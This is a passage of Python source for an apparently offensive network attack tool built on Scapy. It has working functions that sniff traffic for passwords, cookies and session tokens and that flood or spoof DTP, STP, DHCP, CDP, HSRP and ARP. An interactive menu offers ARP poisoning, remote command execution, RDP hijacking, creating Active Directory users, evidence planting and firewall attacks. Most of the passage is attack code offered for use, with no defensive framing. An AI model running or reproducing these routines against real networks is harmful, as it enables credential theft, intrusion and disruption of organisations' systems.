                                        print(f"[Policy-Provoke] Found policy file: {interesting_file}")
                                        results[f'found_{interesting_file}'] = True
                        except:
                            pass
    except Exception as e:
        print(f"[Policy-Provoke] Error: {e}")
    
    # Check for other policy-related shares
    policy_shares = ['NETLOGON', 'SYSVOL', 'Scripts']
    for share in policy_shares:
        try:
            result = subprocess.run([
                'smbclient', f'\\\\{target_ip}\\{share}', '-N', '-c', 'ls'
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[Policy-Provoke] Accessible policy share: {share}")
                results[f'policy_share_{share}'] = True
        except:
            pass
    
    return results

def provoke_data_transfer_interception(iface, target_ip, duration=60):
    """
    Monitor for data transfers and attempt interception
    """
    print(f"[Data-Intercept] Monitoring data transfers to/from {target_ip} for {duration} seconds")
    
    intercepted_data = []
    
    def packet_handler(pkt):
        if pkt.haslayer(IP) and (pkt[IP].src == target_ip or pkt[IP].dst == target_ip):
            # Look for data transfers
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                payload = pkt[Raw].load
                
                # Check for common data patterns
                if len(payload) > 100:  # Significant data transfer
                    # Look for file signatures or interesting data
                    file_signatures = {
                        b'PK\x03\x04': 'ZIP',
                        b'%PDF': 'PDF',
                        b'\xFF\xD8\xFF': 'JPEG',
                        b'\x89PNG': 'PNG',
                        b'Microsoft': 'Office',
                        b'<!DOCTYPE': 'HTML',
                        b'<?xml': 'XML',
                    }
                    
                    for sig, file_type in file_signatures.items():
                        if sig in payload[:20]:
                            print(f"[Data-Intercept] Possible {file_type} file transfer detected")
                            intercepted_data.append({
                                'time': datetime.now(),
                                'type': file_type,
                                'size': len(payload),
                                'source': pkt[IP].src,
                                'destination': pkt[IP].dst,
                                'sample': payload[:100].hex()  # First 100 bytes as hex
                            })
                            break
                    
                    # Look for credentials or sensitive data patterns
                    sensitive_patterns = [
                        b'password=', b'user=', b'login=', b'credential=',
                        b'Authorization:', b'Cookie:', b'SessionID=',
                    ]
                    
                    for pattern in sensitive_patterns:
                        if pattern in payload:
                            print(f"[Data-Intercept] Sensitive data pattern found: {pattern}")
                            # Extract context around the pattern
                            start = max(0, payload.find(pattern) - 20)
                            end = min(len(payload), start + 100)
                            context = payload[start:end]
                            
                            intercepted_data.append({
                                'time': datetime.now(),
                                'type': 'sensitive_data',
                                'pattern': pattern.decode(),
                                'context': context.decode('utf-8', errors='ignore'),
                                'source': pkt[IP].src,
                                'destination': pkt[IP].dst
                            })
                            break
    
    # Start sniffing
    sniff_thread = threading.Thread(
        target=lambda: sniff(iface=iface, filter=f"host {target_ip}", prn=packet_handler, timeout=duration),
        daemon=True
    )
    sniff_thread.start()
    
    # Generate some traffic to provoke responses
    provoke_traffic = [
        IP(dst=target_ip)/TCP(dport=445, flags="S"),  # SMB
        IP(dst=target_ip)/TCP(dport=139, flags="S"),  # NetBIOS
        IP(dst=target_ip)/TCP(dport=80, flags="S"),   # HTTP
        IP(dst=target_ip)/TCP(dport=443, flags="S"),  # HTTPS
        IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com")),  # DNS
    ]
    
    for packet in provoke_traffic:
        sendp(Ether()/packet, iface=iface, verbose=False)
        time.sleep(1)
    
    sniff_thread.join()
    
    print(f"[Data-Intercept] Completed. Intercepted {len(intercepted_data)} data events")
    return intercepted_data

def advanced_dtp_exploit(iface, target_mac, attack_type="all"):
    """
    Advanced DTP exploits that go beyond basic spoofing
    """
    print(f"[DTP-Advanced] Launching advanced DTP attacks against {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    advanced_packets = []
    
    # Yersinia-style DTP packet collection
    if attack_type == "all" or "double_encap" in attack_type:
        # Double encapsulation exploit
        dtp_double = Ether(dst=target_mac, src=our_mac)/ \
                    Dot1Q(vlan=1)/ \
                    LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                    SNAP(OUI=0x0c, code=0x2004)/ \
                    Raw(load=bytes.fromhex("0001000100040000"))
        advanced_packets.append(("double_encapsulation", dtp_double))
    
    if attack_type == "all" or "corrupted_tlv" in attack_type:
        # Corrupted TLV field exploit
        dtp_corrupted = Ether(dst=target_mac, src=our_mac)/ \
                       LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                       SNAP(OUI=0x0c, code=0x2004)/ \
                       Raw(load=bytes.fromhex("00FF0001000400FF"))  # Corrupted TLV
        advanced_packets.append(("corrupted_tlv", dtp_corrupted))
    
    if attack_type == "all" or "flood" in attack_type:
        # DTP flood with varying states
        states = [
            ("dynamic_auto", bytes.fromhex("0001000100040000")),
            ("dynamic_desirable", bytes.fromhex("0003000100040003")),
            ("trunk", bytes.fromhex("0005000100040005")),
            ("nonegotiate", bytes.fromhex("0007000100040007"))
        ]
        
        for state_name, state_bytes in states:
            dtp_flood = Ether(dst=target_mac, src=our_mac)/ \
                       LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                       SNAP(OUI=0x0c, code=0x2004)/ \
                       Raw(load=state_bytes)
            advanced_packets.append((f"flood_{state_name}", dtp_flood))
    
    # Execute the advanced attacks
    for attack_name, packet in advanced_packets:
        try:
            sendp(packet, iface=iface, count=10, inter=0.1, verbose=False)
            print(f"[DTP-Advanced] Sent {attack_name} exploit")
            time.sleep(0.5)
        except Exception as e:
            print(f"[DTP-Advanced] Error in {attack_name}: {e}")

def advanced_stp_exploit(iface, attack_type="tcn_flood"):
    """
    Advanced STP attacks beyond root bridge takeover
    """
    print(f"[STP-Advanced] Launching {attack_type} attack")
    
    our_mac = get_if_hwaddr(iface)
    
    if attack_type == "tcn_flood":
        # Topology Change Notification flood
        for i in range(1000):
            spoofed_mac = f"00:{(i % 256):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}"
            
            stp_tcn = Ether(dst="01:80:c2:00:00:00", src=spoofed_mac)/ \
                     LLC(dsap=0x42, ssap=0x42, ctrl=3)/ \
                     STP(bpdutype=0x80)  # TCN BPDU
            
            sendp(stp_tcn, iface=iface, verbose=False)
            
            if i % 100 == 0:
                print(f"[STP-Advanced] Sent {i} TCN BPDUs")
    
    elif attack_type == "confusion_attack":
        # STP confusion with inconsistent BPDUs
        priorities = [0, 4096, 8192, 32768]
        root_macs = [our_mac, "00:00:00:00:00:01", "00:00:00:00:00:02"]
        
        for i in range(500):
            priority = random.choice(priorities)
            root_mac = random.choice(root_macs)
            
            stp_confusion = Ether(dst="01:80:c2:00:00:00", src=our_mac)/ \
                          LLC(dsap=0x42, ssap=0x42, ctrl=3)/ \
                          STP(bpdutype=0x00, rootid=priority, rootmac=root_mac,
                              bridgeid=priority, bridgemac=our_mac)
            
            sendp(stp_confusion, iface=iface, verbose=False)
    
    elif attack_type == "max_age_attack":
        # Set max age to extreme values
        stp_maxage = Ether(dst="01:80:c2:00:00:00", src=our_mac)/ \
                    LLC(dsap=0x42, ssap=0x42, ctrl=3)/ \
                    STP(bpdutype=0x00, maxage=255, hellotime=255, forwarddelay=255)
        
        sendp(stp_maxage, iface=iface, count=50, inter=0.1, verbose=False)

def advanced_dhcp_exploit(iface, attack_type="option_overload"):
    """
    Advanced DHCP attacks with malicious option crafting
    """
    print(f"[DHCP-Advanced] Launching {attack_type} attack")
    
    our_mac = get_if_hwaddr(iface)
    
    if attack_type == "option_overload":
        # DHCP with excessive/overlength options
        malicious_options = [
            ("domain_name", "A" * 300),  # Overlength domain
            ("router", "1.1.1.1," + "2.2.2.2," * 50),  # Excessive routers
            ("name_server", "8.8.8.8," + "9.9.9.9," * 30),  # Excessive DNS
        ]
        
        for opt_name, opt_value in malicious_options:
            dhcp_malicious = Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/ \
                           IP(src="0.0.0.0", dst="255.255.255.255")/ \
                           UDP(sport=68, dport=67)/ \
                           BOOTP(chaddr=binascii.unhexlify(our_mac.replace(":", "")))/ \
                           DHCP(options=[("message-type", "discover"),
                                        (opt_name, opt_value),
                                        "end"])
            
            sendp(dhcp_malicious, iface=iface, count=5, inter=0.5, verbose=False)
    
    elif attack_type == "malformed_chaddr":
        # Malformed chaddr field attacks
        for i in range(100):
            malformed_chaddr = os.urandom(20)  # Random chaddr data
            
            dhcp_malformed = Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/ \
                           IP(src="0.0.0.0", dst="255.255.255.255")/ \
                           UDP(sport=68, dport=67)/ \
                           BOOTP(chaddr=malformed_chaddr)/ \
                           DHCP(options=[("message-type", "discover"), "end"])
            
            sendp(dhcp_malformed, iface=iface, verbose=False)

def cdp_protocol_exploit(iface, target_mac, exploit_type="version_overflow"):
    """
    Advanced CDP protocol exploitation
    """
    print(f"[CDP-Advanced] {exploit_type} attack against {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    
    if exploit_type == "version_overflow":
        # CDP version overflow attempt
        cdp_overflow = Ether(dst=target_mac, src=our_mac)/ \
                      LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                      SNAP(OUI=0x00000c, code=0x2000)/ \
                      Raw(load=bytes.fromhex("0001000b00000001000100340002000f") + 
                          b"Cisco IOS " + b"A" * 500 +  # Overflow version
                          bytes.fromhex("0003000c00000001000100050004000c") +
                          b"Catalyst" + b"B" * 300)
        
        sendp(cdp_overflow, iface=iface, count=10, inter=0.5, verbose=False)
    
    elif exploit_type == "malformed_tlv":
        # Malformed TLV sequences
        malformed_tlvs = [
            bytes.fromhex("FFFF0000"),  # Invalid TLV
            bytes.fromhex("0000FFFF"),  # Zero length, large value
            bytes.fromhex("00FF0000"),  # Invalid type
        ]
        
        for tlv in malformed_tlvs:
            cdp_malformed = Ether(dst=target_mac, src=our_mac)/ \
                          LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                          SNAP(OUI=0x00000c, code=0x2000)/ \
                          Raw(load=tlv + os.urandom(100))
            
            sendp(cdp_malformed, iface=iface, count=5, inter=0.2, verbose=False)

def hsrp_authentication_bypass(iface, vip, group=1, attack_type="auth_crack"):
    """
    Advanced HSRP authentication bypass techniques
    """
    print(f"[HSRP-Advanced] {attack_type} attack for VIP {vip}")
    
    our_mac = get_if_hwaddr(iface)
    
    if attack_type == "auth_crack":
        # HSRP authentication brute force/common passwords
        common_passwords = ["cisco", "Cisco", "CISCO", "", "password", "default", "letmein"]
        
        for password in common_passwords:
            hsrp_auth = Ether(dst="01:00:5e:00:00:02", src=our_mac)/ \
                       IP(src=vip, dst="224.0.0.2")/ \
                       UDP(sport=1985, dport=1985)/ \
                       HSRP(group=group, priority=255, auth=password, virtualIP=vip)
            
            sendp(hsrp_auth, iface=iface, count=3, inter=0.3, verbose=False)
            print(f"[HSRP-Advanced] Trying password: '{password}'")
    
    elif attack_type == "auth_null":
        # Null authentication and malformed auth fields
        hsrp_null = Ether(dst="01:00:5e:00:00:02", src=our_mac)/ \
                   IP(src=vip, dst="224.0.0.2")/ \
                   UDP(sport=1985, dport=1985)/ \
                   HSRP(group=group, priority=255, auth="\x00"*8, virtualIP=vip)
        
        sendp(hsrp_null, iface=iface, count=10, inter=0.1, verbose=False)
        
        # Very long authentication string
        hsrp_long_auth = Ether(dst="01:00:5e:00:00:02", src=our_mac)/ \
                        IP(src=vip, dst="224.0.0.2")/ \
                        UDP(sport=1985, dport=1985)/ \
                        HSRP(group=group, priority=255, auth="A"*50, virtualIP=vip)
        
        sendp(hsrp_long_auth, iface=iface, count=5, inter=0.2, verbose=False)

def advanced_arp_exploit(iface, target_ip, attack_type="arp_stack"):
    """
    Advanced ARP protocol exploitation
    """
    print(f"[ARP-Advanced] {attack_type} attack against {target_ip}")
    
    our_mac = get_if_hwaddr(iface)
    
    if attack_type == "arp_stack":
        # ARP stack overflow attempts
        for i in range(1000):
            malformed_arp = Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/ \
                          ARP(op=1, 
                              hwsrc=our_mac,
                              psrc="0.0.0.0",
                              pdst=target_ip,
                              hwlen=random.randint(0, 255),
                              plen=random.randint(0, 255),
                              hwdst="ff:ff:ff:ff:ff:ff")
            
            sendp(malformed_arp, iface=iface, verbose=False)
    
    elif attack_type == "gratuitous_flood":
        # Gratuitous ARP with malformed fields
        for i in range(500):
            spoofed_ip = f"10.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            gratuitous_malformed = Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/ \
                                 ARP(op=2,
                                     psrc=spoofed_ip,
                                     pdst=spoofed_ip,
                                     hwsrc=our_mac,
                                     hwdst="ff:ff:ff:ff:ff:ff",
                                     hwtype=random.choice([0x0001, 0xFFFF]),
                                     ptype=random.choice([0x0800, 0x0806, 0xFFFF]))
            
            sendp(gratuitous_malformed, iface=iface, verbose=False)            

def run_chat(iface, default_cidr):
    print(f"[Chat] Advanced Wired Recon Tool on {platform.system()} — type 'help' for commands.")
    
    # Detect if we're running in VMware
    is_vmware = detect_vmware()
    if is_vmware:
        print("[VMware] Detected: Running in VMware environment")
        print("[VMware] Using virtualization-aware discovery techniques")
    
    while True:
        try:
            cmd = input('> ').strip().split()
            if not cmd:
                continue
            c = cmd[0].lower()
            if c == 'help':
                print(f"""
Commands:
  help                Show this help message
  scan [CIDR]         Active ARP scan with manufacturer detection (default: {default_cidr})
  portscan <IP>       Scan common ports on target IP
  services <IP>       Discover services with banner grabbing
  fullscan <IP>       Comprehensive enterprise port scan
  ad-discover [DOMAIN] Discover Active Directory via DNS
  netbios-scan [CIDR] Scan for NetBIOS/Windows hosts
  smb-scan <TARGET>   Scan for SMB services (IP or CIDR)
  vmware-scan         Discover VMware hosts and services
  hypervisor-info     Detect virtualization environment
  escape-scan         Scan for network escape routes
  sniff               Passive IP/TCP sniffing with advanced detection
  pivot <MAC> <IP>    ARP-poison target MAC and IP
  mass-attack         ARP-poison all discovered hosts
  traffic-gen [IP]    Generate advanced TCP/IP traffic patterns
  fw-evade <IP>       Firewall evasion techniques against target
  rfc-break <IP>      Generate RFC-breaking packets
  manuf-detect        Show manufacturer information for discovered hosts
  wireshark-view [N]  Show last N packets in Wireshark-style format
  auto-mode           Run automated reconnaissance and attack sequence
  vlan-hop [VLAN_ID]  Discover and hop VLANs (802.1Q)
  extreme-scan        Extreme aggressive scanning with multiple techniques
  stop-traffic        Stop traffic generation
  
  Internal Traffic Analysis:
  internal-traffic    Show internal network traffic patterns
  network-topology    Show network communication map
  device-profiles     Show detailed device communication profiles
  network-segments    Detect network segments and subnets
  
  AD Enumeration:
  ad-enum <IP>        Active Directory enumeration (no credentials required)
  ad-users <IP>       Extract AD user information
  ad-groups <IP>      Extract AD group information
  ad-computers <IP>   Extract AD computer information
  ad-gpo <IP>         Attempt to extract GPO information from SYSVOL
  ad-ou <IP>          Extract Organizational Unit structure
  ad-trusts <IP>      Discover domain trusts
  
  Lateral Movement:
  enum-shares <IP> [user] [pass]    Enumerate SMB shares
  enum-services <IP> [user] [pass]  Enumerate services
  copy-file <IP> <local> <remote> [user] [pass]  Copy file to remote system
  exec-command <IP> <command> [user] [pass]      Execute command remotely
  change-wallpaper <IP> [user] [pass]            Change remote wallpaper
  rdp-hijack <IP> [user] [pass]                  Attempt RDP session hijacking
  
  Evidence Planting:
  ad-evidence <IP> <type> [content]  Plant evidence in AD/SMB shares
  ad-create-user <IP> <user> <pass>  Create AD user
  ad-modify-schema <IP>              Modify AD schema
  
  Advanced L2 Attacks:
  dtp-spoof [state]           DTP spoofing (dynamic_auto/desirable/trunk)
  dhcp-starvation [net]       DHCP starvation attack
  rogue-dhcp [pool]           Rogue DHCP server injection
  stp-root [priority]         STP root bridge attack
  cdp-lldp-spoof [info]       CDP/LLDP spoofing
  mac-flood [count]           MAC flooding (CAM table exhaustion)
  eapol-bypass <MAC>          802.1X EAPOL bypass
  bpdu-inject [vlan]          BPDU injection
  vtp-manip [domain] [rev]    VTP manipulation
  icmp-redirect <tgt> <gw> <rdr> ICMP redirect injection
  arp-storm [net]             ARP storm generator
  garp-flood <spoof_ip>       Gratuitous ARP flooding
  dhcp-inform <tgt> <srv>     DHCP inform spoofing
  hsrp-hijack <vip> [grp]     HSRP/VRRP hijacking
  pppoe-hijack <sess> <MAC>   PPPoE session hijacking
  port-security <MAC>         Port security violation trigger
  loopback-flood              Loopback flood attack
  etherchannel-spoof <MAC> [proto] EtherChannel spoofing
  qinq-abuse <inner> <outer>  QinQ VLAN abuse
  ipv6-ra-spoof <prefix>      IPv6 Router Advertisement spoofing
  ipv6-dhcpv6-rogue <prefix>  IPv6 DHCPv6 rogue server
  nd-spoof <tgt> <spoof>      ND spoofing (Neighbor Discovery)
  nd-poison <tgt> <MAC>       ND cache poisoning
  dhcpv6-starvation           DHCPv6 starvation
  eapol-flood <MAC>           802.1X fake supplicant flood
  lacp-spoof <sys> [key]      LACP spoofing
  ethertype-covert <type> [data] Custom EtherType covert channel
  padding-exploit <MAC> [size] Ethernet frame padding exploits
  igmp-abuse <group>          IGMP snooping abuse
  mld-spoof <group>           MLD (IPv6 Multicast) spoofing
  
  Firewall Attacks:
  fw-session-extract <IP> [community] Firewall session table extraction
  fw-admin-track <IP> [community] Track firewall admin sessions
  fw-log-flood <IP>           Trigger log flood to blind logging
  fw-failover-test <IP>       Simulated failover test for config leak
  fw-policy-clone <IP>        Policy cloning via reflective rule mapping
  fw-vlan-bypass <IP> [inner] [outer] Bypass inter-VLAN ACLs via tunneling
  fw-nat-extract <IP>         Extract NAT tables via TCP timestamp
  fw-mgmt-hijack <IP> <gw>    Hijack firewall management interface
  fw-dpi-bypass <IP>          Detect and exploit DPI misclassifications
  
  exit                Quit
""")
            elif c == 'provoke-ad':
                if len(cmd) < 2:
                    print('Usage: provoke-ad <IP> [techniques]')
                else:
                    techniques = cmd[2] if len(cmd) > 2 else "all"
                    results = provoke_ad_extraction(cmd[1], techniques)
                    print(f"[AD-Provoke] Results: {json.dumps(results, indent=2)}")
            
            elif c == 'provoke-fileserver':
                if len(cmd) < 2:
                    print('Usage: provoke-fileserver <IP> [share_name]')
                else:
                    share_name = cmd[2] if len(cmd) > 2 else None
                    results = provoke_fileserver_extraction(cmd[1], share_name)
                    print(f"[Fileserver-Provoke] Results: {json.dumps(results, indent=2)}")
            
            elif c == 'provoke-dns':
                if len(cmd) < 2:
                    print('Usage: provoke-dns <IP> [domain]')
                else:
                    domain = cmd[2] if len(cmd) > 2 else None
                    results = provoke_dns_extraction(cmd[1], domain)
                    print(f"[DNS-Provoke] Results: {json.dumps(results, indent=2)}")
            
            elif c == 'provoke-policies':
                if len(cmd) < 2:
                    print('Usage: provoke-policies <IP>')
                else:
                    results = provoke_policy_extraction(cmd[1])
                    print(f"[Policy-Provoke] Results: {json.dumps(results, indent=2)}")
            
            elif c == 'intercept-data':
                if len(cmd) < 2:
                    print('Usage: intercept-data <IP> [duration]')
                else:
                    duration = int(cmd[2]) if len(cmd) > 2 else 60
                    results = provoke_data_transfer_interception(iface, cmd[1], duration)
                    print(f"[Data-Intercept] Results: {json.dumps(results, indent=2)}")

            elif c == 'scan':
                cidr = cmd[1] if len(cmd) > 1 else default_cidr
                aggressive = len(cmd) > 2 and cmd[2].lower() == 'aggressive'
                eth_arp_scan(iface, cidr, aggressive=aggressive)
            elif c == 'portscan':
                if len(cmd) < 2:
                    print('Usage: portscan <IP>')
                else:
                    port_scan(cmd[1], COMMON_PORTS[:50])  # Scan first 50 common ports
            elif c == 'services':
                if len(cmd) < 2:
                    print('Usage: services <IP>')
                else:
                    service_discovery(cmd[1])
            elif c == 'fullscan':
                if len(cmd) < 2:
                    print('Usage: fullscan <IP>')
                else:
                    port_scan(cmd[1], COMMON_PORTS)
            elif c == 'ad-discover':
                domain = cmd[1] if len(cmd) > 1 else None
                discover_ad_dns(domain)
            elif c == 'netbios-scan':
                cidr = cmd[1] if len(cmd) > 1 else default_cidr
                netbios_discovery(cidr)
            elif c == 'smb-scan':
                if len(cmd) < 2:
                    print('Usage: smb-scan <IP or CIDR>')
                else:
                    target = cmd[1]
                    if '/' in target:
                        for ip in ipaddress.ip_network(target).hosts():
                            smb_discovery(str(ip))
                    else:
                        smb_discovery(target)
            elif c == 'vmware-scan':
                cidr = cmd[1] if len(cmd) > 1 else default_cidr
                vmware_discovery(cidr)
            elif c == 'hypervisor-info':
                detect_hypervisor_details()
            elif c == 'escape-scan':
                escape_route_scan(iface)
            elif c == 'sniff':
                eth_sniff_flows(iface)
            elif c == 'pivot':
                if len(cmd) < 3:
                    print('Usage: pivot <MAC> <IP>')
                else:
                    eth_pivot(iface, cmd[1], cmd[2])
            elif c == 'mass-attack':
                mass_attack(iface)
            elif c == 'traffic-gen':
                target_ip = cmd[1] if len(cmd) > 1 else None
                threading.Thread(target=generate_advanced_traffic, 
                               args=(iface, target_ip), daemon=True).start()
            elif c == 'fw-evade':
                if len(cmd) < 2:
                    print('Usage: fw-evade <IP>')
                else:
                    firewall_evasion(iface, cmd[1])
            elif c == 'rfc-break':
                if len(cmd) < 2:
                    print('Usage: rfc-break <IP>')
                else:
                    generate_rfc_breaking(iface, cmd[1])
            elif c == 'manuf-detect':
                show_manufacturer_info()
            elif c == 'wireshark-view':
                limit = int(cmd[1]) if len(cmd) > 1 else 20
                wireshark_view(limit)
            elif c == 'auto-mode':
                auto_mode(iface, default_cidr)
            elif c == 'vlan-hop':
                vlan_id = int(cmd[1]) if len(cmd) > 1 else None
                threading.Thread(target=vlan_hop, args=(iface, vlan_id), daemon=True).start()
            elif c == 'extreme-scan':
                extreme_scan(iface, default_cidr)
            elif c == 'internal-traffic':
                show_internal_traffic()
            elif c == 'network-topology':
                show_network_topology()
            elif c == 'device-profiles':
                show_device_profiles()
            elif c == 'network-segments':
                detect_network_segments()
            elif c == 'ad-enum':
                if len(cmd) < 2:
                    print('Usage: ad-enum <IP>')
                else:
                    ad_enumerate(cmd[1])
            elif c == 'ad-users':
                if len(cmd) < 2:
                    print('Usage: ad-users <IP>')
                else:
                    ad_get_users(cmd[1])
            elif c == 'ad-groups':
                if len(cmd) < 2:
                    print('Usage: ad-groups <IP>')
                else:
                    ad_get_groups(cmd[1])
            elif c == 'ad-computers':
                if len(cmd) < 2:
                    print('Usage: ad-computers <IP>')
                else:
                    ad_get_computers(cmd[1])
            elif c == 'ad-gpo':
                if len(cmd) < 2:
                    print('Usage: ad-gpo <IP>')
                else:
                    ad_get_gpo_info(cmd[1])
            elif c == 'ad-ou':
                if len(cmd) < 2:
                    print('Usage: ad-ou <IP>')
                else:
                    ad_get_ou_structure(cmd[1])
            elif c == 'ad-trusts':
                if len(cmd) < 2:
                    print('Usage: ad-trusts <IP>')
                else:
                    ad_get_domain_trusts(cmd[1])
            elif c == 'enum-shares':
                if len(cmd) < 2:
                    print('Usage: enum-shares <IP> [username] [password]')
                else:
                    username = cmd[2] if len(cmd) > 2 else None
                    password = cmd[3] if len(cmd) > 3 else None
                    enum_shares(cmd[1], username, password)
# [Continuing from the previous code...]

            elif c == 'enum-services':
                if len(cmd) < 2:
                    print('Usage: enum-services <IP> [username] [password]')
                else:
                    username = cmd[2] if len(cmd) > 2 else None
                    password = cmd[3] if len(cmd) > 3 else None
                    enum_services(cmd[1], username, password)
            elif c == 'copy-file':
                if len(cmd) < 4:
                    print('Usage: copy-file <IP> <local_path> <remote_path> [username] [password]')
                else:
                    username = cmd[4] if len(cmd) > 4 else None
                    password = cmd[5] if len(cmd) > 5 else None
                    copy_file(cmd[1], cmd[2], cmd[3], username, password)
            elif c == 'exec-command':
                if len(cmd) < 3:
                    print('Usage: exec-command <IP> <command> [username] [password]')
                else:
                    username = cmd[3] if len(cmd) > 3 else None
                    password = cmd[4] if len(cmd) > 4 else None
                    exec_command(cmd[1], cmd[2], username, password)
            elif c == 'change-wallpaper':
                if len(cmd) < 2:
                    print('Usage: change-wallpaper <IP> [username] [password]')
                else:
                    username = cmd[2] if len(cmd) > 2 else None
                    password = cmd[3] if len(cmd) > 3 else None
                    change_wallpaper(cmd[1], username, password)
            elif c == 'rdp-hijack':
                if len(cmd) < 2:
                    print('Usage: rdp-hijack <IP> [username] [password]')
                else:
                    username = cmd[2] if len(cmd) > 2 else None
                    password = cmd[3] if len(cmd) > 3 else None
                    rdp_hijack(cmd[1], username, password)
            elif c == 'ad-evidence':
                if len(cmd) < 3:
                    print('Usage: ad-evidence <IP> <message|wallpaper|lnk> [content]')
                else:
                    content = cmd[3] if len(cmd) > 3 else "TALON WAS HERE"
                    ad_leave_evidence(cmd[1], cmd[2], content)
            elif c == 'ad-create-user':
                if len(cmd) < 4:
                    print('Usage: ad-create-user <IP> <username> <password>')
                else:
                    ad_create_user(cmd[1], cmd[2], cmd[3])
            elif c == 'ad-modify-schema':
                if len(cmd) < 2:
                    print('Usage: ad-modify-schema <IP>')
                else:
                    ad_modify_schema(cmd[1])
            
            # Advanced L2 Attack Commands
            elif c == 'dtp-spoof':
                state = cmd[1] if len(cmd) > 1 else "dynamic_auto"
                dtp_spoofing_attack(iface, desired_state=state)
            elif c == 'dhcp-starvation':
                network = cmd[1] if len(cmd) > 1 else "192.168.1.0/24"
                dhcp_starvation_attack(iface, network)
            elif c == 'rogue-dhcp':
                pool_start = cmd[1] if len(cmd) > 1 else "192.168.1.100"
                rogue_dhcp_server(iface, pool_start=pool_start)
            elif c == 'stp-root':
                priority = int(cmd[1]) if len(cmd) > 1 else 0
                stp_root_bridge_attack(iface, priority)
            elif c == 'cdp-lldp-spoof':
                device_id = cmd[1] if len(cmd) > 1 else "CiscoSwitch"
                cdp_lldp_spoofing(iface, device_id=device_id)
            elif c == 'mac-flood':
                count = int(cmd[1]) if len(cmd) > 1 else 100000
                mac_flooding(iface, count)
            elif c == 'eapol-bypass':
                if len(cmd) < 2:
                    print('Usage: eapol-bypass <MAC>')
                else:
                    eapol_bypass(iface, cmd[1])
            elif c == 'bpdu-inject':
                vlan = int(cmd[1]) if len(cmd) > 1 else 1
                bpdu_injection(iface, vlan)
            elif c == 'vtp-manip':
                domain = cmd[1] if len(cmd) > 1 else "EVIL_DOMAIN"
                revision = int(cmd[2]) if len(cmd) > 2 else 1000
                vtp_manipulation(iface, domain, revision)
            elif c == 'icmp-redirect':
                if len(cmd) < 4:
                    print('Usage: icmp-redirect <target_ip> <gateway_ip> <redirect_ip>')
                else:
                    icmp_redirect_injection(iface, cmd[1], cmd[2], cmd[3])
            elif c == 'arp-storm':
                network = cmd[1] if len(cmd) > 1 else "192.168.1.0/24"
                arp_storm_generator(iface, network)
            elif c == 'garp-flood':
                if len(cmd) < 2:
                    print('Usage: garp-flood <spoof_ip>')
                else:
                    gratuitous_arp_flood(iface, cmd[1])
            elif c == 'dhcp-inform':
                if len(cmd) < 3:
                    print('Usage: dhcp-inform <target_ip> <spoof_server>')
                else:
                    dhcp_inform_spoofing(iface, cmd[1], cmd[2])
            elif c == 'hsrp-hijack':
                vip = cmd[1] if len(cmd) > 1 else "192.168.1.1"
                group = int(cmd[2]) if len(cmd) > 2 else 1
                hsrp_vrrp_hijacking(iface, vip, group)
            elif c == 'pppoe-hijack':
                if len(cmd) < 3:
                    print('Usage: pppoe-hijack <session_id> <MAC>')
                else:
                    pppoe_session_hijacking(iface, cmd[1], cmd[2])
            elif c == 'port-security':
                if len(cmd) < 2:
                    print('Usage: port-security <MAC>')
                else:
                    port_security_violation(iface, cmd[1])
            elif c == 'loopback-flood':
                loopback_flood_attack(iface)
            elif c == 'etherchannel-spoof':
                if len(cmd) < 2:
                    print('Usage: etherchannel-spoof <MAC> [protocol]')
                else:
                    protocol = cmd[2] if len(cmd) > 2 else "pagp"
                    etherchannel_spoofing(iface, cmd[1], protocol)
            elif c == 'qinq-abuse':
                inner_vlan = int(cmd[1]) if len(cmd) > 1 else 100
                outer_vlan = int(cmd[2]) if len(cmd) > 2 else 200
                qinq_vlan_abuse(iface, inner_vlan, outer_vlan)
            elif c == 'ipv6-ra-spoof':
                prefix = cmd[1] if len(cmd) > 1 else "2001:db8:1::/64"
                ipv6_router_advertisement_spoofing(iface, prefix)
            elif c == 'ipv6-dhcpv6-rogue':
                prefix = cmd[1] if len(cmd) > 1 else "2001:db8:1::/64"
                ipv6_dhcpv6_rogue_server(iface, prefix)
            elif c == 'nd-spoof':
                if len(cmd) < 3:
                    print('Usage: nd-spoof <target_ipv6> <spoof_ipv6>')
                else:
                    nd_spoofing(iface, cmd[1], cmd[2])
            elif c == 'nd-poison':
                if len(cmd) < 3:
                    print('Usage: nd-poison <target_ipv6> <MAC>')
                else:
                    nd_cache_poisoning(iface, cmd[1], cmd[2])
            elif c == 'dhcpv6-starvation':
                dhcpv6_starvation(iface)
            elif c == 'eapol-flood':
                if len(cmd) < 2:
                    print('Usage: eapol-flood <MAC>')
                else:
                    eapol_fake_supplicant_flood(iface, cmd[1])
            elif c == 'lacp-spoof':
                system_id = cmd[1] if len(cmd) > 1 else "00:00:00:00:00:01"
                key = int(cmd[2]) if len(cmd) > 2 else 1
                lacp_spoofing(iface, system_id, key)
            elif c == 'ethertype-covert':
                ethertype = int(cmd[1], 16) if len(cmd) > 1 else 0x8888
                payload = cmd[2] if len(cmd) > 2 else "SECRET"
                custom_ethertype_covert_channel(iface, ethertype, payload)
            elif c == 'padding-exploit':
                if len(cmd) < 2:
                    print('Usage: padding-exploit <MAC> [size]')
                else:
                    size = int(cmd[2]) if len(cmd) > 2 else 1000
                    ethernet_frame_padding_exploit(iface, cmd[1], size)
            elif c == 'igmp-abuse':
                group = cmd[1] if len(cmd) > 1 else "224.0.0.1"
                igmp_snooping_abuse(iface, group)
            elif c == 'mld-spoof':
                group = cmd[1] if len(cmd) > 1 else "ff02::1"
                mld_spoofing(iface, group)
            
            # Firewall Attack Commands
            elif c == 'fw-session-extract':
                if len(cmd) < 2:
